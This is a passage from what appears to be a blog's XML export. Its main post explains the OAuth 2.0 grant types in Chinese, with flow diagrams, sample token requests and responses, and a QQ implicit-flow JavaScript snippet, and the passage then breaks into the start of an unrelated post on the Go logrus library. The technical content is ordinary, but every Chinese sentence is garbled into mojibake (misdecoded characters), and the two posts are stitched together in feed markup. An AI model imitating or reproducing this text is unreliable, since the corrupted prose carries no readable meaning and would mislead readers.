æˆæƒç æ¨¡å¼æˆæƒç æ¨¡å¼(authorization code)æ˜¯åŠŸèƒ½æœ€å®Œæ•´ã€æµç¨‹æœ€ä¸¥å¯†çš„æˆæƒæ¨¡å¼, ä¹Ÿæ˜¯å„å¤§å¼€æ”¾å¹³å°ä¸»è¦ä½¿ç”¨çš„æ¨¡å¼, å®ƒçš„ç‰¹ç‚¹å°±æ˜¯åœ¨clientä¸resource ownerç›´æ¥åŠ å…¥ä¸€å±‚æˆæƒæœåŠ¡(authorization server)ä½œä¸ºä¸­ä»‹, è§„é¿äº†resource ownerå’Œclientç›´æ¥äº¤äº’äº§ç”Ÿçš„å®‰å…¨éšæ‚£, è¯¥æ¨¡å¼å®Œç¾çš„è§£å†³äº†ä¹‹å‰æåˆ°çš„ä¼ ç»Ÿclient-serverè®¤è¯æ¨¡å¼ä¸­çš„ç¬¬ä¸‰æ–¹åº”ç”¨è®¿é—®èµ„äº§æ‰€æœ‰è€…æ•°æ®çš„éš¾é¢˜ã€‚ åº”ç”¨åœºæ™¯: ç¬¬ä¸‰æ–¹åº”ç”¨éœ€è¦è®¿é—®èµ„äº§æ‰€æœ‰è€…çš„æ•°æ®ã€‚å¹¶ä¸”ç¬¬ä¸‰æ–¹åº”ç”¨æœ‰è‡ªå·±çš„æœåŠ¡ç«¯, ä¹Ÿå°±æ˜¯å¸¸è§çš„Server-Side Applicationå…¸å‹åº”ç”¨: ç¬¬ä¸‰æ–¹ç™»å½•, æ¯”å¦‚ä¸Šé¢æåˆ°çš„åœºæ™¯æµç¨‹å›¾:12345678910111213141516171819202122232425+----------+| Resource || Owner || |+----------+ ^ | (B)+----|-----+ Client Identifier +---------------+| -+----(A)-- &amp; Redirection URI ----&gt;| || User- | | Authorization || Agent -+----(B)-- User authenticates ---&gt;| Server || | | || -+----(C)-- Authorization Code ---&lt;| |+-|----|---+ +---------------+ | | ^ v(A) (C) | | | | | | ^ v | |+---------+ | || |&gt;---(D)-- Authorization Code ---------&apos; || Client | &amp; Redirection URI || | || |&lt;---(E)----- Access Token -------------------&apos;+---------+ (w/ Optional Refresh Token) A. ç”¨æˆ·é€šè¿‡æµè§ˆå™¨è®¿é—®æˆæƒæœåŠ¡å™¨, ä¸€èˆ¬æ˜¯ç¬¬ä¸‰æ–¹åº”ç”¨æ”¾ç½®é“¾æ¥, å°†ç”¨æˆ·å¼•å¯¼è‡³ç›¸åº”çš„æˆæƒæœåŠ¡å™¨æ¯”å¦‚ä»¥ä¸Šé¢æ‹‰å‹¾ä¸ºä¾‹, ä»–ä¼šæ”¾ç½®æœ‰å¯èƒ½å­˜å‚¨ç”¨æˆ·profileä¿¡æ¯çš„æˆæƒæœåŠ¡å™¨çš„è®¿é—®åœ°å€:123&lt;a href="/oauth20/auth_sinaWeiboProvider.html" target="_blank" class="icon_wb" title="ä½¿ç”¨æ–°æµªå¾®åšå¸å·ç™»å½•"&gt;&lt;/a&gt;&lt;a href="/oauth20/auth_qqProvider.html" class="icon_qq" target="_blank" title="ä½¿ç”¨è…¾è®¯QQå¸å·ç™»å½•"&gt;&lt;/a&gt;&lt;a href="/oauth20/auth_weixinProvider.html" class="icon_weixin" target="_blank" title="ä½¿ç”¨å¾®ä¿¡å¸å·ç™»å½•"&gt;&lt;/a&gt; æ¯”å¦‚æˆ‘è®©æ‹‰å‹¾ç½‘è¯»å–æˆ‘å­˜å‚¨åœ¨å¾®åšä¸Šé¢çš„ç”¨æˆ·èµ„æ–™, å› æ­¤æˆ‘ä¼šè¢«å¼•å¯¼è‡³å¾®åšçš„æˆæƒæœåŠ¡,è¿›è¡Œæˆæƒ, åŒæ—¶æ‹‰å‹¾ç½‘ä¼šå¸¦ä¸Šè‡ªå·±åœ¨å¾®åšå¼€æ”¾å¹³å°æ³¨å†Œçš„å®¢æˆ·ç«¯ä¿¡æ¯, å¦‚ä¸‹å›¾:è€Œå…·ä½“çš„æˆæƒè¯·æ±‚æ ¼å¼å¦‚ä¸‹:123GET /authorize?response_type=code&amp;client_id=s6BhdRkqt3&amp;state=xyz &amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1Host: server.example.com å…¶ä¸­çš„å‚æ•°: response_typeï¼šè¡¨ç¤ºæˆæƒç±»å‹ï¼Œå¿…é€‰é¡¹ï¼Œæ­¤å¤„çš„å€¼å›ºå®šä¸ºâ€codeâ€ client_idï¼šè¡¨ç¤ºå®¢æˆ·ç«¯çš„IDï¼Œå¿…é€‰é¡¹ redirect_uriï¼šè¡¨ç¤ºé‡å®šå‘URIï¼Œå¯é€‰é¡¹ scopeï¼šè¡¨ç¤ºç”³è¯·çš„æƒé™èŒƒå›´ï¼Œå¯é€‰é¡¹ stateï¼šè¡¨ç¤ºå®¢æˆ·ç«¯çš„å½“å‰çŠ¶æ€ï¼Œå¯ä»¥æŒ‡å®šä»»æ„å€¼ï¼Œè®¤è¯æœåŠ¡å™¨ä¼šåŸå°ä¸åŠ¨åœ°è¿”å›è¿™ä¸ªå€¼ã€‚ B. ç”¨æˆ·æˆæƒç°åœ¨æˆ‘å·²ç»åˆ°äº†å¾®è–„çš„æˆæƒæœåŠ¡é¡µé¢, éœ€è¦æˆ‘å¯¹æ‹‰å‹¾ç½‘è®¿é—®çš„ç›¸åº”æ•°æ®è¿›è¡Œæˆæƒ, å› æ­¤æˆ‘éœ€è¦ç™»å½•, ç„¶åè¿›è¡Œæˆæƒ: ç™»å½• æˆæƒ ç„¶åæˆ‘ç‚¹å‡»è¿æ¥(å…¶å®è¿™ä¸ªæŒ‰é’®æ”¹æˆæˆæƒæ¯”è¾ƒåˆé€‚, å…¶ä»–oauthå¯¹äºçš„è¿™é‡Œä¹ŸåŸºæœ¬éƒ½å«æˆæƒ), æ­¤æ—¶æˆ‘å®Œæˆäº†æˆ‘å¯¹æ‹‰å‹¾ç½‘å“åº”æƒé™çš„æˆæƒã€‚ C. Authorization server å°†ç”¨æˆ·å¯¼å‘ç¬¬ä¸‰æ–¹åº”ç”¨(æ‹‰å‹¾ç½‘)ç«¯äº‹å…ˆæŒ‡å®šçš„â€é‡å®šå‘URIâ€(A æ­¥éª¤ä¸­ä¼ å…¥çš„redirection_uri),åŒæ—¶é™„ä¸Šä¸€ä¸ªæˆæƒç ä»ä¸Šå›¾ä¸­çš„refererå¯ä»¥çœ‹å‡º, è·³è½¬æ˜¯æ¥è‡ªå¾®åšçš„æˆæƒæœåŠ¡å™¨çš„, å¹¶ä¸”query stringæºå¸¦è¿™code å…·ä½“æ ¼å¼å¦‚ä¸‹:123HTTP/1.1 302 FoundLocation: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA &amp;state=xyz å…¶ä¸­å‚æ•°: codeï¼šè¡¨ç¤ºæˆæƒç ï¼Œå¿…é€‰é¡¹ã€‚è¯¥ç çš„æœ‰æ•ˆæœŸåº”è¯¥å¾ˆçŸ­ï¼Œé€šå¸¸è®¾ä¸º10åˆ†é’Ÿï¼Œå®¢æˆ·ç«¯åªèƒ½ä½¿ç”¨è¯¥ç ä¸€æ¬¡ï¼Œå¦åˆ™ä¼šè¢«æˆæƒæœåŠ¡å™¨æ‹’ç»ã€‚è¯¥ç ä¸å®¢æˆ·ç«¯IDå’Œé‡å®šå‘URIï¼Œæ˜¯ä¸€ä¸€å¯¹åº”å…³ç³»ã€‚ stateï¼šå¦‚æœå®¢æˆ·ç«¯çš„è¯·æ±‚ä¸­åŒ…å«è¿™ä¸ªå‚æ•°ï¼Œè®¤è¯æœåŠ¡å™¨çš„å›åº”ä¹Ÿå¿…é¡»ä¸€æ¨¡ä¸€æ ·åŒ…å«è¿™ä¸ªå‚æ•°ã€‚ D. ç¬¬ä¸‰æ–¹åº”ç”¨(æ‹‰å‹¾ç½‘)åƒAuthorization serverè¯·æ±‚tokenè¿™ä¸€æ­¥åœ¨æ‹‰å‹¾ç½‘çš„åå°æœåŠ¡å™¨è¿›è¡Œ, ä»ç•Œé¢ä¸Šæ˜¯çœ‹ä¸åˆ°, å…·ä½“è¿‡ç¨‹ä¸º: æ‹‰å‹¾ç½‘è·å–åˆ°codeè¿‡å, ä»¥codeå‘å¾®åšæ”¶å–æœåŠ¡å™¨è¯·æ±‚, æ¢å–å¯ä»¥è®¿é—®å¾®åšèµ„æºæœåŠ¡çš„token.è¯·æ±‚çš„æ ·ä¾‹å¤§è‡´å¦‚ä¸‹:1234567POST /token HTTP/1.1Host: server.example.comAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JWContent-Type: application/x-www-form-urlencodedgrant_type=authorization_code&amp;code=SplxlOBeZQQYbYS6WxSbIA&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb å…¶ä¸­å‚æ•°: grant_typeï¼šè¡¨ç¤ºä½¿ç”¨çš„æˆæƒæ¨¡å¼ï¼Œå¿…é€‰é¡¹ï¼Œæ­¤å¤„çš„å€¼å›ºå®šä¸ºâ€authorization_codeâ€œã€‚ codeï¼šè¡¨ç¤ºä¸Šä¸€æ­¥è·å¾—çš„æˆæƒç ï¼Œå¿…é€‰é¡¹ã€‚ redirect_uriï¼šè¡¨ç¤ºé‡å®šå‘URIï¼Œå¿…é€‰é¡¹ï¼Œä¸”å¿…é¡»ä¸Aæ­¥éª¤ä¸­çš„è¯¥å‚æ•°å€¼ä¿æŒä¸€è‡´ã€‚ client_idï¼šè¡¨ç¤ºå®¢æˆ·ç«¯IDï¼Œå¿…é€‰é¡¹ã€‚ E. Authorization serveréªŒè¯codeåˆæ³•è¿‡åè¿”å›tokenè¿”å›çš„tokenæ•°æ®æ ·ä¾‹å¤§è‡´å¦‚ä¸‹:123456789101112HTTP/1.1 200 OKContent-Type: application/json;charset=UTF-8Cache-Control: no-storePragma: no-cache&#123; &quot;access_token&quot;:&quot;2YotnFZFEjr1zCsicMWpAA&quot;, &quot;token_type&quot;:&quot;example&quot;, &quot;expires_in&quot;:3600, &quot;refresh_token&quot;:&quot;tGzv3JOkF0XG5Qx2TlKWIA&quot;, &quot;example_parameter&quot;:&quot;example_value&quot;&#125; å…¶ä¸­å‚æ•°: access_tokenï¼šè¡¨ç¤ºè®¿é—®ä»¤ç‰Œï¼Œå¿…é€‰é¡¹ã€‚ token_typeï¼šè¡¨ç¤ºä»¤ç‰Œç±»å‹ï¼Œè¯¥å€¼å¤§å°å†™ä¸æ•æ„Ÿï¼Œå¿…é€‰é¡¹ï¼Œå¯ä»¥æ˜¯bearerç±»å‹æˆ–macç±»å‹ã€‚ expires_inï¼šè¡¨ç¤ºè¿‡æœŸæ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œå¿…é¡»å…¶ä»–æ–¹å¼è®¾ç½®è¿‡æœŸæ—¶é—´ã€‚ refresh_tokenï¼šè¡¨ç¤ºæ›´æ–°ä»¤ç‰Œï¼Œç”¨æ¥è·å–ä¸‹ä¸€æ¬¡çš„è®¿é—®ä»¤ç‰Œï¼Œå¯é€‰é¡¹ã€‚ scopeï¼šè¡¨ç¤ºæƒé™èŒƒå›´ï¼Œå¦‚æœä¸å®¢æˆ·ç«¯ç”³è¯·çš„èŒƒå›´ä¸€è‡´ï¼Œæ­¤é¡¹å¯çœç•¥ã€‚ ç®€åŒ–æ¨¡å¼é‡‡ç”¨Implicit Grantæ–¹å¼è·å–Access Tokençš„æˆæƒéªŒè¯æµç¨‹åˆè¢«ç§°ä¸ºUser-Agent Flow, å®ƒä¸é€šè¿‡ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ï¼Œç›´æ¥åœ¨æµè§ˆå™¨ä¸­å‘è®¤è¯æœåŠ¡å™¨ç”³è¯·ä»¤ç‰Œï¼Œè·³è¿‡äº†â€æˆæƒç â€è¿™ä¸ªæ­¥éª¤ï¼Œå› æ­¤å¾—åã€‚æ‰€æœ‰æ­¥éª¤åœ¨æµè§ˆå™¨ä¸­å®Œæˆï¼Œä»¤ç‰Œå¯¹è®¿é—®è€…æ˜¯å¯è§çš„ï¼Œä¸”å®¢æˆ·ç«¯ä¸éœ€è¦è®¤è¯ã€‚ åº”ç”¨åœºæ™¯: é€‚ç”¨äºæ‰€æœ‰æ— Serverç«¯é…åˆçš„åº”ç”¨(ç”±äºåº”ç”¨å¾€å¾€ä½äºä¸€ä¸ªUser Agenté‡Œï¼Œå¦‚æµè§ˆå™¨é‡Œé¢ï¼Œå› æ­¤è¿™ç±»åº”ç”¨åœ¨æŸäº›å¹³å°ä¸‹åˆè¢«ç§°ä¸ºClient-Side Application), å¦‚æ‰‹æœº/æ¡Œé¢å®¢æˆ·ç«¯ç¨‹åºã€æµè§ˆå™¨æ’ä»¶ç­‰ï¼Œä»¥åŠåŸºäºJavaScriptç­‰è„šæœ¬å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€å®ç°çš„åº”ç”¨ï¼Œä»–ä»¬çš„ä¸€ä¸ªå…±åŒç‰¹ç‚¹æ˜¯ï¼Œæ— æœåŠ¡ç«¯,æ— æ³•ç›‘å¬ç«¯å£ç›´æ¥æ”¶åˆ°å›è°ƒtoken, å¹¶ä¸”åº”ç”¨æ— æ³•å¦¥å–„ä¿ç®¡å…¶åº”ç”¨å¯†é’¥(App Secret Key), å¦‚æœé‡‡å–Authorization Codeæ¨¡å¼ï¼Œåˆ™ä¼šå­˜åœ¨æ³„æ¼å…¶åº”ç”¨å¯†é’¥(api_scret)çš„å¯èƒ½æ€§å…¸å‹åº”ç”¨: æš‚æ—¶æ²¡çœ‹åˆ°ç›¸å…³åº”ç”¨ä½¿ç”¨è¯¥æ¨¡å¼æµç¨‹å›¾:1234567891011121314151617181920212223242526272829303132+----------+| Resource || Owner || |+----------+ ^ | (B)+----|-----+ Client Identifier +---------------+| -+----(A)-- &amp; Redirection URI ---&gt;| || User- | | Authorization || Agent -|----(B)-- User authenticates --&gt;| Server || | | || |&lt;---(C)--- Redirection URI ----&lt;| || | with Access Token +---------------+| | in Fragment| | +---------------+| |----(D)--- Redirection URI ----&gt;| Web-Hosted || | without Fragment | Client || | | Resource || (F) |&lt;---(E)------- Script ---------&lt;| || | +---------------++-|--------+ | |(A) (G) Access Token | | ^ v+---------+| || Client || |+---------+ A. å®¢æˆ·ç«¯å°†ç”¨æˆ·å¯¼å‘è®¤è¯æœåŠ¡å™¨å’Œä¹‹å‰çš„auth codeæ¨¡å¼æ¯”èµ·æ¥, ä»…ä»…æ˜¯response_typeå˜æˆäº†token, å…¶ä»–è¿‡ç¨‹ä¸å˜ã€‚123GET /authorize?response_type=token&amp;client_id=s6BhdRkqt3&amp;state=xyz &amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1Host: server.example.com B. ç”¨æˆ·å†³å®šæ˜¯å¦ç»™äºå®¢æˆ·ç«¯æˆæƒè¿™éƒ¨åˆ†åŒauth codeæ¨¡å¼ä¸€æ · C. å‡è®¾ç”¨æˆ·ç»™äºˆæˆæƒï¼Œè®¤è¯æœåŠ¡å™¨å°†ç”¨æˆ·å¯¼å‘å®¢æˆ·ç«¯æŒ‡å®šçš„â€é‡å®šå‘URIâ€ï¼Œå¹¶åœ¨URIçš„Hashéƒ¨åˆ†åŒ…å«äº†è®¿é—®ä»¤ç‰Œè¿™é‡Œæœ€å¤§çš„åŒºåˆ«å°±æ˜¯: ç›´æ¥è¿”å›token, è€Œä¸æ˜¯code.123HTTP/1.1 302 FoundLocation: http://example.com/cb#access_token=2YotnFZFEjr1zCsicMWpAA &amp;state=xyz&amp;token_type=example&amp;expires_in=3600 æ³¨æ„è¿™é‡Œçš„è¿™ä¸ªå›è°ƒåœ°å€, åœ¨æˆæƒç æ¨¡å¼ä¸‹ è¯¥åœ°å€ä»¥åŠquery stringéƒ½æ˜¯éœ€è¦æœåŠ¡ç«¯å¤„ç†çš„, ä½†æ˜¯åœ¨ç®€åŒ–æ¨¡å¼ä¸‹, æ˜¯æ²¡æœ‰æœåŠ¡ç«¯ç¨‹åºå‚åŠ çš„, å› æ­¤ç®€åŒ–æ¨¡å¼ä¸‹è¯¥callback urlä»…ä»…æ˜¯ä¸€ä¸ªé™æ€é¡µé¢åœ°å€.å› æ­¤åœ¨ç®€åŒ–æ¨¡å¼ä¸‹, éœ€è¦é€šè¿‡æµè§ˆå™¨è·å–åˆ°callback urlä¸­çš„å‚æ•°, è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæœ‰æ¥ä¸‹æ¥2æ­¥çš„åŸå› ã€‚ D. æµè§ˆå™¨å‘èµ„æºæœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œå…¶ä¸­ä¸åŒ…æ‹¬ä¸Šä¸€æ­¥æ”¶åˆ°çš„Hashå€¼ã€‚æµè§ˆå™¨å‘Web-Hostedè¯·æ±‚è·å–tokençš„è„šæœ¬ä»£ç  E. èµ„æºæœåŠ¡å™¨è¿”å›ä¸€ä¸ªç½‘é¡µï¼Œå…¶ä¸­åŒ…å«çš„ä»£ç å¯ä»¥è·å–Hashå€¼ä¸­çš„ä»¤ç‰Œã€‚Web-Hostedè¿”å›ç»™æµè§ˆå™¨(user-agent)ä¸€æ®µæå‰access tokençš„è„šæœ¬ F.æµè§ˆå™¨æ‰§è¡Œä¸Šä¸€æ­¥è·å¾—çš„è„šæœ¬ï¼Œæå–å‡ºä»¤ç‰Œã€‚æµè§ˆå™¨æ‰§è¡Œè¯¥è„šæœ¬, æå–å‡ºaccess token æ³¨æ„åœ¨è¯¥æ¨¡å¼çš„å®ç°è¿‡ç¨‹ä¸­, Då’ŒEæ­¥ä¸€èˆ¬éƒ½ä¼šçœç•¥æ‰, å› ä¸ºWeb-Hosted Client Resourceæä¾›çš„è¿™æ®µtokenæå–è„šæœ¬, å®¢æˆ·ç«¯å¯ä»¥è‡ªå·±å®ç°:1234567891011121314151617181920212223242526272829303132333435363738&lt;script&gt; function callback(user) &#123; var userName = document.getElementById('userName'); var greetingText = document.createTextNode('Greetings, '+ user.openid + '.'); userName.appendChild(greetingText); &#125; //åº”ç”¨çš„APPIDï¼Œè¯·æ”¹ä¸ºä½ è‡ªå·±çš„ var appID = "YOUR_APP_ID"; //æˆåŠŸæˆæƒåçš„å›è°ƒåœ°å€ï¼Œè¯·æ”¹ä¸ºä½ è‡ªå·±çš„ var redirectURI = "http://qzs.qq.com/qzone/openapi/success.html"; //æ„é€ è¯·æ±‚ if (window.location.hash.length == 0) &#123; var path = 'https://graph.qq.com/oauth2.0/authorize?'; var queryParams = ['client_id=' + appID,'redirect_uri=' + redirectURI,' scope=' + 'get_user_info,list_album,upload_pic,add_feeds,do_like','response_type=token']; var query = queryParams.join('&amp;'); var url = path + query; window.open(url); &#125; else &#123; //è·å–access token(ç›´æ¥è·å–urlå‚æ•°é‡Œé¢çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯access token) var accessToken = window.location.hash.substring(1); //ä½¿ç”¨Access Tokenæ¥è·å–ç”¨æˆ·çš„OpenID var path = "https://graph.qq.com/oauth2.0/me?"; var queryParams = [accessToken, 'callback=callback']; var query = queryParams.join('&amp;'); var url = path + query; var script = document.createElement('script'); script.src = url; document.body.appendChild(script); &#125;&lt;/script&gt; G.æµè§ˆå™¨å°†ä»¤ç‰Œå‘ç»™å®¢æˆ·ç«¯æµè§ˆå™¨å°†access tokenäº¤ç»™å®¢æˆ·ç«¯, å…¸å‹çš„åŠæ³•å°±æ˜¯å°†tokenå­˜å…¥æµè§ˆå™¨, ç­‰å¾…clientè·å–ã€‚ å¯†ç æ¨¡å¼å¯†ç æ¨¡å¼(Resource Owner Password Credentials Grant)ä¸­ï¼Œç”¨æˆ·å‘å®¢æˆ·ç«¯(ç¬¬ä¸‰æ–¹åº”ç”¨)ç›´æ¥æä¾›è‡ªå·±çš„ç”¨æˆ·åå’Œå¯†ç ã€‚å®¢æˆ·ç«¯ä½¿ç”¨è¿™äº›ä¿¡æ¯, å‘â€æœåŠ¡å•†æä¾›å•†â€ç´¢è¦æˆæƒã€‚åœ¨è¿™ç§æ¨¡å¼ä¸­, ç”¨æˆ·å¿…é¡»æŠŠè‡ªå·±çš„å¯†ç ç»™å®¢æˆ·ç«¯ï¼Œä½†æ˜¯å®¢æˆ·ç«¯ä¸å¾—å‚¨å­˜å¯†ç ã€‚è¿™é€šå¸¸ç”¨åœ¨ç”¨æˆ·å¯¹å®¢æˆ·ç«¯(ç¬¬ä¸‰æ–¹åº”ç”¨)é«˜åº¦ä¿¡ä»»çš„æƒ…å†µä¸‹ï¼Œæ¯”å¦‚å®¢æˆ·ç«¯æ˜¯æ“ä½œç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ï¼Œæˆ–è€…ç”±ä¸€ä¸ªè‘—åå…¬å¸å‡ºå“ã€‚è€Œè®¤è¯æœåŠ¡å™¨åªæœ‰åœ¨å…¶ä»–æˆæƒæ¨¡å¼æ— æ³•æ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œæ‰èƒ½è€ƒè™‘ä½¿ç”¨è¿™ç§æ¨¡å¼ã€‚ åº”ç”¨åœºæ™¯: ç¬¬è¯¥åº”ç”¨ç»å¯¹ä¿¡ä»»å…¸å‹åº”ç”¨: åº”ç”¨ç¨‹åºè‡ªå·±çš„dashboardç¨‹åºæµç¨‹å›¾:1234567891011121314151617+----------+| Resource || Owner || |+----------+ v | Resource Owner (A) Password Credentials | v+---------+ +---------------+| |&gt;--(B)---- Resource Owner -------&gt;| || | Password Credentials | Authorization || Client | | Server || |&lt;--(C)---- Access Token ---------&lt;| || | (w/ Optional Refresh Token) | |+---------+ +---------------+ A. ç”¨æˆ·å‘ç¬¬ä¸‰æ–¹åº”ç”¨æä¾›è‡ªå·±çš„ç”¨æˆ·åå’Œå¯†ç ç”¨æˆ·å°†è‡ªå·±çš„å¯†ç ç»™ç¬¬ä¸‰æ–¹åº”ç”¨ã€‚ B. ç¬¬ä¸‰æ–¹åº”ç”¨å°†ç”¨æˆ·åå’Œå¯†ç å‘ç»™è®¤è¯æœåŠ¡å™¨ï¼Œå‘åè€…è¯·æ±‚ä»¤ç‰Œ123456POST /token HTTP/1.1Host: server.example.comAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JWContent-Type: application/x-www-form-urlencodedgrant_type=password&amp;username=johndoe&amp;password=A3ddj3w å…¶ä¸­å‚æ•°: grant_type: è¡¨ç¤ºæˆæƒç±»å‹ï¼Œæ­¤å¤„çš„å€¼å›ºå®šä¸ºâ€passwordâ€ï¼Œå¿…é€‰é¡¹ã€‚ username: è¡¨ç¤ºç”¨æˆ·åï¼Œå¿…é€‰é¡¹ã€‚ password: è¡¨ç¤ºç”¨æˆ·çš„å¯†ç ï¼Œå¿…é€‰é¡¹ã€‚ scope: è¡¨ç¤ºæƒé™èŒƒå›´ï¼Œå¯é€‰é¡¹ã€‚ C. è®¤è¯æœåŠ¡å™¨ç¡®è®¤æ— è¯¯åï¼Œå‘å®¢æˆ·ç«¯æä¾›è®¿é—®ä»¤ç‰Œ123456789101112HTTP/1.1 200 OKContent-Type: application/json;charset=UTF-8Cache-Control: no-storePragma: no-cache&#123; &quot;access_token&quot;:&quot;2YotnFZFEjr1zCsicMWpAA&quot;, &quot;token_type&quot;:&quot;example&quot;, &quot;expires_in&quot;:3600, &quot;refresh_token&quot;:&quot;tGzv3JOkF0XG5Qx2TlKWIA&quot;, &quot;example_parameter&quot;:&quot;example_value&quot;&#125; å…¶ä¸­å‚æ•°: access_tokenï¼šè¡¨ç¤ºè®¿é—®ä»¤ç‰Œï¼Œå¿…é€‰é¡¹ã€‚ token_typeï¼šè¡¨ç¤ºä»¤ç‰Œç±»å‹ï¼Œè¯¥å€¼å¤§å°å†™ä¸æ•æ„Ÿï¼Œå¿…é€‰é¡¹ï¼Œå¯ä»¥æ˜¯bearerç±»å‹æˆ–macç±»å‹ã€‚ expires_inï¼šè¡¨ç¤ºè¿‡æœŸæ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œå¿…é¡»å…¶ä»–æ–¹å¼è®¾ç½®è¿‡æœŸæ—¶é—´ã€‚ refresh_tokenï¼šè¡¨ç¤ºæ›´æ–°ä»¤ç‰Œï¼Œç”¨æ¥è·å–ä¸‹ä¸€æ¬¡çš„è®¿é—®ä»¤ç‰Œï¼Œå¯é€‰é¡¹ã€‚ scopeï¼šè¡¨ç¤ºæƒé™èŒƒå›´ï¼Œå¦‚æœä¸å®¢æˆ·ç«¯ç”³è¯·çš„èŒƒå›´ä¸€è‡´ï¼Œæ­¤é¡¹å¯çœç•¥ã€‚ å®¢æˆ·ç«¯æ¨¡å¼å®¢æˆ·ç«¯æ¨¡å¼ï¼ˆClient Credentials Grantï¼‰æŒ‡å®¢æˆ·ç«¯ä»¥è‡ªå·±çš„åä¹‰ï¼Œè€Œä¸æ˜¯ä»¥ç”¨æˆ·çš„åä¹‰ï¼Œå‘â€æœåŠ¡æä¾›å•†â€è¿›è¡Œè®¤è¯ã€‚ä¸¥æ ¼åœ°è¯´ï¼Œå®¢æˆ·ç«¯æ¨¡å¼å¹¶ä¸å±äºOAuthæ¡†æ¶æ‰€è¦è§£å†³çš„é—®é¢˜ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸­ï¼Œç”¨æˆ·ç›´æ¥å‘å®¢æˆ·ç«¯æ³¨å†Œï¼Œå®¢æˆ·ç«¯ä»¥è‡ªå·±çš„åä¹‰è¦æ±‚â€æœåŠ¡æä¾›å•†â€æä¾›æœåŠ¡ï¼Œå…¶å®ä¸å­˜åœ¨æˆæƒé—®é¢˜ã€‚ åº”ç”¨åœºæ™¯: å…¸å‹åº”ç”¨: å†…éƒ¨æœåŠ¡, Resource Server A å’Œ Resource Server B çš„è®¿é—®é—®é¢˜ã€‚æµç¨‹å›¾:1234567+---------+ +---------------+| | | || |&gt;--(A)- Client Authentication ---&gt;| Authorization || Client | | Server || |&lt;--(B)---- Access Token ---------&lt;| || | | |+---------+ +---------------+ A. å®¢æˆ·ç«¯å‘è®¤è¯æœåŠ¡å™¨è¿›è¡Œèº«ä»½è®¤è¯ï¼Œå¹¶è¦æ±‚ä¸€ä¸ªè®¿é—®ä»¤ç‰Œã€‚å®¢æˆ·ç«¯ç›´æ¥ä½¿ç”¨clientå‡­è¯è·å–tokne123456POST /token HTTP/1.1Host: server.example.comAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JWContent-Type: application/x-www-form-urlencodedgrant_type=client_credentials B. è®¤è¯æœåŠ¡å™¨ç¡®è®¤æ— è¯¯åï¼Œå‘å®¢æˆ·ç«¯æä¾›è®¿é—®ä»¤ç‰Œã€‚æˆæƒæœåŠ¡ç›´æ¥è¿”å›token1234567891011HTTP/1.1 200 OKContent-Type: application/json;charset=UTF-8Cache-Control: no-storePragma: no-cache&#123; &quot;access_token&quot;:&quot;2YotnFZFEjr1zCsicMWpAA&quot;, &quot;token_type&quot;:&quot;example&quot;, &quot;expires_in&quot;:3600, &quot;example_parameter&quot;:&quot;example_value&quot;&#125; å‚è€ƒ è…¾è®¯å¼€å‘å¹³å°-å¼€å‘æ”»ç•¥_Client-side OAuth2.0 RFCæ–‡æ¡£ PKCE æ‰©å±•RFCæ–‡æ¡£]]></content>
      <categories>
        <category>åè®®è¯¦è§£</category>
        <category>OAUTH2</category>
      </categories>
      <tags>
        <tag>oauth2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golangæ—¥å¿—ä¹‹logrusçš„ä½¿ç”¨]]></title>
    <url>%2F2017%2F11%2F27%2Fgolang-log%2F</url>
    <content type="text"><![CDATA[å› ä¸ºæ ‡å‡†åº“çš„æ—¥å¿—åº“ç¼ºå°‘Log Level, å¦‚æœåŸºäºæ ‡å‡†åº“æ‰©å±•è‡ªå·±çš„loggerä¹Ÿéœ€è¦èŠ±ä¸€ç‚¹æ—¶é—´, çœ‹githubçš„ä¸Šå¾ˆå¤šå¼€æºé¡¹ç›®éƒ½ä½¿ç”¨ä¸€ä¸ªå«logrusçš„æ¨¡å—, äºæ˜¯ç ”ç©¶äº†ä¸‹, å‘ç°å®ƒå…·æœ‰é«˜åº¦çš„çµæ´»æ€§, è€Œä¸”å·²ç»æœ‰å¾ˆå¤šå†™å¥½äº†çš„æ’ä»¶, æ¯”å¦‚å’Œlogstachå¯¹æ¥çš„æ’ä»¶,æ‰€ä»¥é¡¹ç›®åé¢å°±åˆ‡æ¢æ—¥å¿—æ¨¡å—ä¸ºlogrus, è¿™ç¯‡åšå®¢å°±æ˜¯ä»‹ç»æˆ‘ä»¬ä½¿ç”¨logrusæ—¶é‡åˆ°çš„å‘, ä»¥åŠä¸€äº›è§£å†³ä¹‹é“ã€‚ ç®€ä»‹logrusåœ¨githubä¸Šç›¸å½“å—æ¬¢è¿, æˆªæ­¢ç›®å‰ä¸ºæ­¢å·²ç»6k+çš„staräº†, åœ¨å¾ˆå¤šå¼€æºé¡¹ç›®ä¸­è¢«ä½¿ç”¨, æ¯”å¦‚docker, prometheusç­‰ä½¿ç”¨è¯¥åº“è¿›è¡Œæ—¥å¿—è®°å½•.å®˜æ–¹å£°ç§°APIå®Œå…¨å…¼å®¹æ ‡å‡†åŒ…logger, é¡¹ç›®åœ°å€: logrus github åœ°å€, å› æ­¤å¦‚æœä½ ä¹‹å‰é¡¹ç›®ä½¿ç”¨çš„æ ‡å‡†åº“é‚£ä¹ˆå¯ä»¥æ— ç¼è¿ç§».logrusæ˜¯ä¸€ä¸ªç»“æ„åŒ–çš„ã€å¯æ’æ‹”çš„æ—¥å¿—è®°å½•å™¨, ä½ 